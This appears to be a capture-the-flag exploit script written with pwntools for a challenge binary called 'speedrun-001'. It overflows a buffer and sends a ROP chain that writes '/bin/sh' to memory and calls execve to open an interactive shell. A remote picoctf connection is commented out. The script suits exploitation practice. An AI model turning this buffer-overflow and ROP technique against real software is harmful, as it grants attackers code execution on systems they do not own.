#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("/tmp/speedrun-001", checksec=False)
#libc = ELF("/tmp/patch/libc.so.6", checksec=False)

p = process()
#p = remote("rhea.picoctf.net", 52106)

gdb.attach(p, gdbscript='''
        b*0x400b90
        c
''')

syscall=0x000000000040129c
pop_rdi=0x0000000000400686
pop_rsi=0x00000000004101f3
pop_rdx=0x000000000044be16
pop_rax=0x0000000000415664
mov__rdi_rdx=0x0000000000435603
_rw=0x6bb700

ropper=b""
ropper+=p64(pop_rdi)
ropper+=p64(_rw)
ropper+=p64(pop_rdx)
ropper+=p64(29400045130965551)
ropper+=p64(mov__rdi_rdx)

ropper+=p64(pop_rsi)
ropper+=p64(0)
ropper+=p64(pop_rdx)
ropper+=p64(0)
ropper+=p64(pop_rax)
ropper+=p64(0x3b)
ropper+=p64(syscall)

payload = b'A'*0x408 
payload += ropper
p.sendlineafter(b"Any last words?\n", payload)



p.interactive()
